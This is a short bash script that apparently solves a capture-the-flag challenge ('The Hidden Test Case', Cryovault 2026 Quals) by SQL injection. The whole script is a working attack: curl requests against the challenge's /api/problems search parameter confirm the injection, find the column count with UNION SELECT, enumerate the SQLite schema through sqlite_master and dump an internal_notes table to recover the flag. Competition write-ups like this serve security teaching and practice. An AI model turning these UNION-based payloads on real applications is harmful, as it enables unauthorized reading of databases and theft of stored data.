#!/usr/bin/env bash
# The Hidden Test Case (Cryovault 2026 Quals) — SQLi via the legacy problem search.
#
# The /api/problems?search= endpoint concatenates our input straight into a
# SQLite query that selects 4 columns (id, title, difficulty, category). A
# 4-column UNION SELECT lets us read any table. The flag lives in internal_notes.
set -euo pipefail
BASE="${1:-https://isfcrpesu-hidden-test-case.chals.io}"

echo "[*] Confirm injection (single quote triggers an error):"
curl -sG --data-urlencode "search='" "$BASE/api/problems"; echo

echo "[*] Column count / order (4-column UNION echoes 1,2,3,4):"
curl -sG --data-urlencode "search=x' UNION SELECT 1,2,3,4-- " "$BASE/api/problems"; echo

echo "[*] Enumerate schema via sqlite_master:"
curl -sG --data-urlencode "search=x' UNION SELECT 0,name,type,sql FROM sqlite_master-- " "$BASE/api/problems"; echo

echo "[*] Dump internal_notes (flag is in the content column -> mapped to 'category'):"
curl -sG --data-urlencode "search=x' UNION SELECT id,note_type,created_at,content FROM internal_notes-- " "$BASE/api/problems"; echo
